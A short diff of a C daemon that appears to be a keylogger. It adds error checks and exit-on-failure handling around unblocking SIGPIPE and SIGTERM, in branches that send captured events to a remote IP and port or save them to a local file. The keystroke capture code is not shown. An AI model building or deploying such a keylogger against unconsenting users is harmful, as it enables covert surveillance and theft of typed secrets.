@@ -65,7 +65,8 @@ int main(int argc, char *argv[])
 
         syslog(LOG_INFO, "Connection opened, IP: %s - PORT: %d", ip, port);
 
-        unblockSignal(SIGPIPE); /* If server closed connection we terminate daemon */
+        if (!unblockSignal(SIGPIPE)) /* Unblocking SIGPIPE */
+            syslog(LOG_ERR, "Couldn't unblock SIGPIPE [%s], quitting..", strerror(errno)), exit(EXIT_FAILURE);  
     }
     else if (file_out_type == FILE) /* If user decided to save events locally */
     {
@@ -75,8 +76,10 @@ int main(int argc, char *argv[])
 
         syslog(LOG_INFO, "%s opened", file_out_path);
 
-        unblockSignal(SIGTERM); /* We can safely terminate daemon only by sending SIGTERM*/
+        if (!unblockSignal(SIGTERM)) /* Unblocking SIGTERM */
+            syslog(LOG_ERR, "Couldn't unblock SIGTERM [%s], quitting..", strerror(errno)), exit(EXIT_FAILURE);
     }
+
 
     syslog(LOG_INFO, "Keylogging...");
 
